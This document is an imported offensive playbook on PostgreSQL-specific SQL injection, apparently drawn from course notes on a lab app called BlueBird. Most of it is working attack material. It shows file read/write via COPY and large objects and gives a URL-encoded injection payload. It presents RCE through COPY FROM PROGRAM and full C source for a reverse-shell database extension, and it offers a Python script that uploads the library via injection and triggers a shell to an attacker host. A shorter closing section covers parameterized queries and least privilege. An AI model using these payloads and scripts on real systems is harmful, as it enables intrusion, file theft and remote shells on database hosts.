---
technique: "PostgreSQL-Specific Techniques"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques.md"
curator_version: 2
review_status: imported-unreviewed
---

# PostgreSQL-Specific Techniques

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: python3.

## Overview

PostgreSQL exposes several built-in mechanisms — the `COPY` command and `large objects` — that a SQL injection can abuse to read and write arbitrary files on the database host, and in some configurations escalate to full remote code execution via `COPY FROM PROGRAM` or a malicious C extension. This playbook covers both file I/O primitives, two RCE paths, and the parameterized-query/least-privilege defenses that close them off.

## Reading/Writing Files

### Method 1: COPY

- Built in [COPY](https://www.postgresql.org/docs/current/sql-copy.html) command
- Intended use of this command is to import/export tables
- File operations run on the system as the `postgres` user

#### Permissions

In order to use `COPY` to read/write files, the user must either have the [pg_read_server_files / pg_write_server_files](https://www.postgresql.org/docs/11/default-roles.html) role respectively, or be a superuser.

```java
SELECT current_setting('is_superuser');
 current_setting 
-----------------
 on
(1 row)

SELECT r.rolname, ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof FROM pg_catalog.pg_roles r WHERE r.rolname='fileuser';
 rolname  |        memberof        
----------+------------------------
 fileuser | {pg_read_server_files}
(1 row)
```

#### Reading Files

- Use the `COPY FROM` syntax to `copy` data from a file into a table in the database
1. Create a temporary table with one text column
2. Copy the contents of our target file into it 
3. Drop it after selecting the contents

```java
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE

bluebird=# COPY tmp FROM '/etc/passwd';
COPY 59

bluebird=# SELECT * FROM tmp LIMIT 5;
                        t                        
-------------------------------------------------
 root:x:0:0:root:/root:/usr/bin/zsh
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
(5 rows)

bluebird=# DROP TABLE tmp;
DROP TABLE
```

One issue with using `COPY` to read files, is that it expects data to be seperated into columns. By default it treats `\t` as a column, so if you try to read a file like `/etc/hosts` you will run into this error.

```java
COPY tmp FROM '/etc/hosts';
ERROR:  extra data after last expected column
CONTEXT:  COPY tmp, line 1: "127.0.0.1  localhost"
```

Unfortunately there is no perfect solution to getting around this, but what we can do is change the `delimiter` from `\t` to some character that is unlikely to appear in the data like this:

```java
bluebird=# COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
COPY 7
bluebird=# SELECT * FROM tmp;
                             t                              
------------------------------------------------------------
 127.0.0.1       localhost
 127.0.1.1       kali
 
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
(7 rows)
```

#### Writing Files

- Writing files using `COPY` works very similarly- instead of `COPY FROM` we will use `COPY TO`
- Use a temporary table to avoid leaving traces behind
- Since all data is put into one column, there is no issue with delimiters when it comes to writing files

```java
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE

bluebird=# INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
INSERT 0 1

bluebird=# COPY tmp TO '/tmp/proof.txt';
COPY 1

bluebird=# DROP TABLE tmp;
DROP TABLE

bluebird=# exit

$ cat /tmp/proof.txt 
To hack, or not to hack, that is the question
```

### Method 2: Large Objects

- [Large objects](https://www.postgresql.org/docs/current/largeobjects.html)

#### Reading Files

- To read a file, we should first use `lo_import` to load the file into a new `large object`
    - Returns the `object ID` of the large object which we will need to reference later once the file is imported

```java
SELECT lo_import('/etc/passwd');
 lo_import 
-----------
     16513
(1 row)
```

- The file will be stored in the `pg_largeobjects` table as a hexstring
- If the size of the file is larger than `2kB`, the `large object` will be split up into `pages` each `2kB` large (`4096` characters when hex encoded)
- We can get the contents with `lo_get(<object id>)`:

```java
SELECT lo_get(16513);
<SNIP>\x726f6f743a783a303a303a726f6f743a2...<SNIP>
```

- Alternatively, you can select data directly from `pg_largeobject`, but this requires specifying the page numbers as well

```java
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=1;
<SNIP>
```

- Once we've obtained the hexstring, we can convert it back using `xxd`

```java
echo 726f6f743<SNIP> | xxd -r -p
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nolog
<SNIP>
```

> Warning: it's not possible to specify an `object ID` when creating the large object, so it does make things harder if you are doing this blindly. One thing you could do is select all `object IDs` from the `pg_largeobject` table and figure out which one is yours.

```java
SELECT DISTINCT loid FROM pg_largeobject;
 loid  
-------
 16515
(1 row)
```

#### Writing Files

- Essentially we will create a large object, insert hex-encoded data `2kb` at a time and then export the large object to a file on disk

```java
$split -b 2048 /etc/passwd

$ ls -l
total 8
-rw-r--r-- 1 kali kali 2048 Feb 25 06:52 xaa
-rw-r--r-- 1 kali kali 1328 Feb 25 06:52 xab
```

```java
xxd -ps -c 99999999999 xaa
726f6f743a783a303a303a726<SNIP>
```

Once that's ready, we can create a `large object` with a known `object ID` with `lo_create`, then insert the hex-encoded data one page at a time into `pg_largeobject`, export the `large object` by `object ID` to a specifiy path with `lo_export` and then finally delete the object from the database with `lo_unlink`.

```java
bluebird=# SELECT lo_create(31337);
 lo_create 
-----------
     31337
(1 row)

bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
INSERT 0 1
bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('6e2f626173<SNIP>96e0a','HEX'));
INSERT 0 1
bluebird=# SELECT lo_export(31337, '/tmp/passwd');
 lo_export 
-----------
         1$
(1 row)

bluebird=# SELECT lo_unlink(31337);
 lo_unlink 
-----------
         1
(1 row)

bluebird=# exit

$ head /tmp/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

> Note: depending on user permissions, the `INSERT` queries may fail. In that case you could try using `lo_put` as it is described in the [documentation](https://www.postgresql.org/docs/current/lo-funcs.html):

```java
SELECT lo_put(31337, 0, 'this is a test');
 lo_put 
--------
 
(1 row)
```

#### Permissions

Any user can create or unlink large objects, but importing, exporting or updating the values require the user to either be a superuser, or to have explicit permissions granted. You may read more about this [here](https://www.postgresql.org/docs/current/lo-interfaces.html).

### Example

```java
name=max
&username=lfygame
&email=x%40x.com','$2a$12$efjEctOv03rB.oskhPzRaO1fJZvBCGXY46nDUkhnwiDwE7tcYTPB2')%3bCREATE+TABLE+tmp+(t+TEXT)%3bINSERT+INTO+tmp+VALUES+('poc')%3bCOPY+tmp+TO+'/var/lib/postgresql/proof.txt'%3bDROP+TABLE+tmp%3b--&password=x&repeatPassword=x
```

```java
email=x@x.com','$2a$12$efjEctOv03rB.oskhPzRaO1fJZvBCGXY46nDUkhnwiDwE7tcYTPB2')
;CREATE TABLE tmp (t TEXT)
;INSERT INTO tmp VALUES ('poc')
;COPY tmp TO '/var/lib/postgresql/proof.txt'
;DROP TABLE tmp;--
```

## Command Execution (RCE)

### Method 1: COPY

#### Permissions

In order to use `COPY` for remote code execution, the user must have the [pg_execute_server_program](https://www.postgresql.org/docs/11/default-roles.html) role, or be a superuser.

#### Exploit

- Use of the built-in [COPY](https://www.postgresql.org/docs/current/sql-copy.html)
- Lets us store data from a `program` in a table
- We can get `PostgreSQL` to run shell commands as the `postgres` user, store the results in a table, and read them out
- CVE ([CVE-2019-9193](https://nvd.nist.gov/vuln/detail/CVE-2019-9193))
    - Intended functionality and therefore not a security issue

```java
bluebird=# CREATE TABLE tmp(t TEXT);
CREATE TABLE
bluebird=# COPY tmp FROM PROGRAM 'id';
COPY 1
bluebird=# SELECT * FROM tmp;
                                   t                                    
------------------------------------------------------------------------
 uid=119(postgres) gid=124(postgres) groups=124(postgres),118(ssl-cert)
(1 row)

bluebird=# DROP TABLE tmp;
DROP TABLE
bluebird=# exit
```

### Method 2: PostgreSQL Extensions

#### Permission

Not every user can create functions in PostgreSQL. To do so, a user must be either a `superuser`, or have the `CREATE` privilege granted on the `public` schema. Additionally, `C` must have been added as a `trusted` language, since it is untrusted by default for all (non-super) users.

#### Exploit

- [Extensions](https://www.postgresql.org/docs/current/external-extensions.html) are libraries that can be loaded into `PostgreSQL` to add custom functionalities
- For example a custom `C` extension for `PostgreSQL` that returns a `reverse shell` as the `postgres` user

```c
// Reverse Shell as a Postgres Extension
// William Moody (@bmdyy)
// 08.02.2023

// CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '.../pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
// SELECT rev_shell('127.0.0.1', 443);
// DROP FUNCTION rev_shell;

// sudo apt install postgresql-server-dev-<version>
// gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>

#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"

PG_MODULE_MAGIC;

PG_FUNCTION_INFO_V1(rev_shell);

Datum
rev_shell(PG_FUNCTION_ARGS)
{
    // Get arguments
    char *LHOST = text_to_cstring(PG_GETARG_TEXT_PP(0));
    int32 LPORT = PG_GETARG_INT32(1);

    // Define necessary struct
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LPORT); // LPORT
    inet_pton(AF_INET, LHOST, &serv_addr.sin_addr); // LHOST

    // Connect to target
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    // Redirect STDOUT/IN/ERR to connection
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Start interactive /bin/sh
    execve("/bin/sh", NULL, NULL);

    PG_RETURN_INT32(0);
}
```

> Note: this specific exploit targets PostgreSQL running on `Linux`. The process for writing and compiling an exploit for `Windows` is very similar, it just requires different API calls and compiling to a DLL.

Near the beginning of the file, you may notice the line `PG_MODULE_MAGIC`. To avoid issues due to incompatibilities, `PostgreSQL` will only allow you to load extensions which were compiled for the correct (major) version. In this case, the version of `PostgreSQL` that we are targeting is `13.9`.

To compile this extension, we need to first install the `postgresql-server-dev` package for version `13`:

```c
sudo apt install postgresql-server-dev-13
```

```c
sudo dnf install postgresql-devel postgresql-server-devel
```

```python
sudo apt install postgresql-server-dev-all
sudo apt install postgresql-server-dev-16
pg_config --includedir-server
```

Once it is installed, we can use `gcc` to compile it to a shared library object like so:

```c
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```

```python
gcc -fPIC -shared -I"$(pg_config --includedir-server)" -I"$(pg_config --includedir)" -o pg_rev_shell.so pg_rev_shell.c
```

The next step is to upload `pg_rev_shell.so` to the webserver. It doesn't matter how you do this (`COPY` or `Large Objects`), as long as you know the exact path it was uploaded to. Once it's been uploaded, we can run `CREATE FUNCTION` to load the `rev_shell` function from the library into the database and then call it to get a reverse shell.

```c
bluebird=# CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
CREATE FUNCTION
bluebird=# SELECT rev_shell('127.0.0.1', 443);
server closed the connection unexpectedly
        This probably means the server terminated abnormally
        before or while processing the request.
```

> Note: even though the file is `pg_rev_shell.so`, the extension is dropped in the `PostgreSQL command`.

When you run the second SQL command, it is expected for the database to 
hang since it's waiting for the function (reverse shell) to finish. If 
you check your listener, you should receive a reverse shell as `postgres`.

```c
nc -nvlp 443
listening on [any] 443 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45692
whoami
postgres
exit
```

After you're done running commands, make sure to clean up after yourself by dropping the function from the database, as well as any large objects you may have created (depending on how you uploaded the library):

```
bluebird=# DROP FUNCTION rev_shell;
DROP FUNCTION
bluebird=# SELECT lo_unlink(58017);
 lo_unlink
-----------
         1
(1 row)
```

### Automation / Writing an Exploit

In some cases it may make sense to write an exploit script to automate the steps for you. Uploading a shared library via large objects and then invoking a function call can require many requests and submitting those all manually can get quite tedious, so this is a good scenario to write a script to do it for you.

Here is a nearly completed script which automates (unauthenticated) command execution against BlueBird. Feel free to use it as a base for the exercise portion of this section.

```python
#!/usr/bin/python3

import requests
import random
import string
from urllib.parse import quote_plus
import math

# Parameters for call to rev_shell
LHOST = "192.168.0.122"
LPORT = 443

# Generate a random string
def randomString(N):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

# Inject a query
def sqli(q):
    # TODO: Use an SQL injection to run the query `q`

# Read the compiled extension
with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000,60000)
sqli(f"SELECT lo_create({loid});")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object
for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{page.hex()}','hex'));")

# Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so');"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;"
query += f"SELECT rev_shell('{LHOST}', {LPORT});"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")
sqli(query)
```

## Prevention

### Introduction

Throughout this module we identified many `SQL injection` vulnerabilities in `BlueBird` which is great for us as attackers, but means work for us as defenders. Let's take a look at what we can do to fix these vulnerabilities and prevent new ones in the future.

### Parameterized Queries

The best way to prevent `SQL injection` is to use `parameterized queries`. This requires developers to write the SQL query with placeholders for variables that are later passed as arguments to the database so that it can easily distinguish between the code and avoid injection vulnerabilities.

The exact syntax for parameterized queries depends on the `database`, `programming language` and `library` you use. In the case of `BlueBird`, we are using `JdbcTemplate` with `PostgreSQL`. Let's take the `SQL injection` vulnerability in `/find-user` as an example. This is what the vulnerable code looks like as is:

```java
// IndexController.java (Lines 50-76)

@GetMapping("/find-user")
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
<SNIP>
        String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
        List<User> users = jdbcTemplate.query(sql, new BeanPropertyRowMapper(User.class));
<SNIP>
}
```

And this is what the same code would like like when using parameterized queries:

```java
// IndexController.java (Lines 50-76)

@GetMapping("/find-user")
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
<SNIP>
        String sql = "SELECT * FROM users WHERE username LIKE CONCAT('%', ?, '%')";
        List<User> users = jdbcTemplate.query(sql, new Object[]{u}, new BeanPropertyRowMapper(User.class));
<SNIP>
}
```

Rather than using `u` when defining `sql`, we put a `?` in the query as a placeholder and then pass `new Object[] {u}` as an argument to `jdbcTemplate.query`.

So now, we could try and run our PoC payload against the 'vulnerable' function once again (`'/**/and/**/1=1--`) and we should see that no results appear, indicating the vulnerability was fixed:

`http://IP:PORT/find-user?u='/**/and/**/1=1--`

### Principle of Least Privilege

In addition to using `parameterized queries`, we should make sure that the user connecting to the database doesn't have more permissions than needed ([Principle of Least Privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege)). In `BlueBird`, all database connections are done as a super user which is completely unnecessary.

#### Large Objects

Since `PostgreSQL 9.0`, writing and reading large objects requires explicit permission. If we need to use `large objects`, then `SELECT/UPDATE` privileges should be granted accordingly as described in the [documentation](https://www.postgresql.org/docs/current/lo-implementation.html).

#### COPY

According to the [documentation](https://www.postgresql.org/docs/current/sql-copy.html), the `COPY` command can only be used by superusers or users with explicit permissions (`pg_read_server_files`, `pg_write_server_files`, `pg_execute_server_program`). If there is no reason for the database user to be reading/writing files, then there is no reason to grant these permissions and allow for additional attack vectors.

#### Extensions

Creating extensions requires `CREATE` access to the given database. If your database user only needs to `SELECT/INSERT/UPDATE` data, then you can easily drop `CREATE` access to prevent any attacks via loading extensions.

### Cheatsheet highlights

A few reference points worth keeping handy from this module's cheat sheet:

**Enabling PostgreSQL Logging** — `/etc/postgresql/13/main/postgresql.conf`:
- Change `#logging_collector = off` to `logging_collector = on`
- `#log_statement = 'none'` to `log_statement = 'all'`
- Uncomment `#log_directory = '...'`
- Uncomment `#log_filename = '...'`

**Common Character Bypasses** (relevant to WAF/filter design, not just attack):
- `/**/` instead of `space`
- `$$string$$` instead of `'string'`

## Source
Original notes:
- `_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques.md`
- `_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques/Reading and Writing Files.md`
- `_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques/Command Execution (RCE).md`
- `_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques/Prevention.md`
